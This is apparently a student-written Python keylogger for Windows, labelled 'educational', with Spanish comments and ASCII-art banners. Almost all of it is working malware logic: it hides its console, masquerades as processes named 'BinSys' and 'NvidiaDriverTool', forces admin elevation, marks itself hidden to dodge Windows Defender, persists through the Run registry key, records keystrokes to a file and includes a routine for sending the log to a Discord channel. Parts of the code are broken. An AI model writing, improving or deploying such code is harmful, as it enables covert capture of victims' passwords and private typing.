#╔════╗       ╔═══╗╔═══╗╔╗         ╔═══╗        
#╚══╗ ║       ║╔═╗║║╔═╗║║║         ║╔═╗║        
#  ╔╝╔╝╔══╗╔═╗║║ ║║║╚═╝║║║ ╔╗╔╗╔══╗║║ ║║╔═╗ ╔══╗
# ╔╝╔╝ ║╔╗║║╔╝║║ ║║║╔══╝║║ ║║║║║══╣║║ ║║║╔╗╗║╔╗║
#╔╝ ╚═╗║║═╣║║ ║╚═╝║║║   ║╚╗║╚╝║╠══║║╚═╝║║║║║║║═╣
#╚════╝╚══╝╚╝ ╚═══╝╚╝   ╚═╝╚══╝╚══╝╚═══╝╚╝╚╝╚══╝
#
#   Github: https://github.com/Zer0plusOne      Discord: @zer0who       Instagram: @sanchez_g2k04                                      
#   This code was made with educational purposes by a ENTI-UB cybersecurity student. [currently in first curse]



from pynput.keyboard import Listener, Key
import os
import setproctitle
import sys
import ctypes
import discord
import asyncio
import threading
import time
import winreg

# Startea el programa escondido como proceso de windows
def start():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    ctypes.windll.kernel32.SetConsoleTitleW("BinSys")
    setproctitle.setproctitle("BinSys")
    os.system("python3 keylogger.py")

# Fuerza a ejecutar el proceso como administrador

def force_admin():
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        return True
    except:
        return False
        pass
# Chequea si el script se ejecuta como administrador

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
if is_admin() == False:
    force_admin()
    if force_admin() == False:
        sys.exit()
# Esconde el proceso del script al Windows Defender
def hide_process():
    try:
        ctypes.windll.kernel32.SetFileAttributesW("keylogger.py", 2)
        return True
    except:
        return False
if hide_process() == True:
    pass
if hide_process() == False:
    print("Windows defender ha detectado el script, cerrando proceso...")
    sys.exit()
# Instala las dependencias del script

def install():
    os.system("pip install pynput")
    os.system("pip install discord")
    os.system("pip install winreg")
    os.system("pip install ctypes")
    os.system("pip install setproctitle")
    os.system("pip install asyncio")
    os.system("pip install threading")
    os.system("pip install time")
    return True
if install == True:
    pass
if install == False:
    sys.exit()

# Forzar la creación del archivo de texto
create_txt = "keylog.txt"
open(create_txt, 'w').close()

# Añade el script al inicio de Windows
def add_to_reg():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "keylogger.py", 0, winreg.REG_SZ, "keylogger.py")
        key.Close()
        return True
    except:
        return False
if add_to_reg() == True:
    print("Script anclado al inicio de Windows")
    # Cambia el nombre del archivo en el registro a "NvidiaDriverTool"
    ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("NvidiaDriverTool")
if add_to_reg() == False:
    print("No se ha podido cambiar el nombre del registro, se recomienda cerrar el script")

    # Caja de confirmacion para cerrar el proceso en este punto

    ask = input("¿Desea cerrar el script?")
    if ask == "y":
        sys.exit()
    if ask == "n":
        pass
# Define el archivo de salida de las teclas

output_file = "keylog.txt"

# Función de escritura de las teclas al archivo

def write_to_file(key):
    with open(output_file, "a") as f:
        if hasattr(key, 'char') and key.char is not None:
            f.write(key.char + "\n")

# Función de salida al presionar una tecla

def on_press(key):
    if key == Key.f12:
        print("Tecla F12 detectada, terminando el proceso...")
        return False  # Detener la escucha del teclado
    write_to_file(key)

# Iniciar la escucha del teclado

with Listener(on_press=on_press) as listener:
    print("Escuchando el teclado...")
    listener.join()   

# Envio de mensaje a canal de discord especificado

def send_to_discord(channel_id, bot_token):
    channel_id = str("")
    bot_token = str("")
    # Crea un cliente de discord
    client = discord.Client()

    @client.event
    async def on_ready():
        print(f"Bot en linea. Nombre:{client.user}")
        # Lee y muestra el archivo de texto 

        with open("keylog.txt", "r") as file:
            content = file.read()
            # Especifica el canal en el que se enviará el mensaje
            channel = client.get_channel(channel_id)
            # Envia el mensaje
            await channel.send(content)
            # Espera de un minuto
            await asyncio.sleep(60)
        
        # Start el cliente con la token especificada
        client.run(bot_token)



#      █████                                    ███                                                             
#   ██████           ██                          ███                                                            
#  ██   █  █    ██  █  █                          ██                                                            
# █    █  █    ███ █                              ██                                                            
#     █  █     ████               ██   ████       ██      ████                                      ███  ████   
#    ██ ██    █ ██          ███    ██    ███  █   ██     █ ███  █    ████         ████        ███    ████ ████ █
#    ██ ██   █             █ ███   ██     ████    ██    █   ████    █  ███  █    █  ███  █   █ ███    ██   ████ 
#    ██ █████             █   ███  ██      ██     ██   ██    ██    █    ████    █    ████   █   ███   ██        
#    ██ ██ ███           ██    ███ ██      ██     ██   ██    ██   ██     ██    ██     ██   ██    ███  ██        
#    ██ ██   ███         ████████  ██      ██     ██   ██    ██   ██     ██    ██     ██   ████████   ██        
#    █  ██    ███        ███████   ██      ██     ██   ██    ██   ██     ██    ██     ██   ███████    ██        
#       █       ███      ██        ██      ██     ██   ██    ██   ██     ██    ██     ██   ██         ██        
#   ████         ███     ████    █  █████████     ██    ██████    ██     ██    ██     ██   ████    █  ███       
#  █  █████        ███  █ ███████     ████ ███    ███ █  ████      ████████     ████████    ███████    ███      
# █    ███           ███   █████            ███    ███               ███ ███      ███ ███    █████              
# █                                  █████   ███                          ███          ███                      
#  █                               ████████  ██                     ████   ███   ████   ███                     
#   █                             █      ████                     ███████  ██  ███████  ██                      
#    ██                                                          █     ████   █     ████                        
#
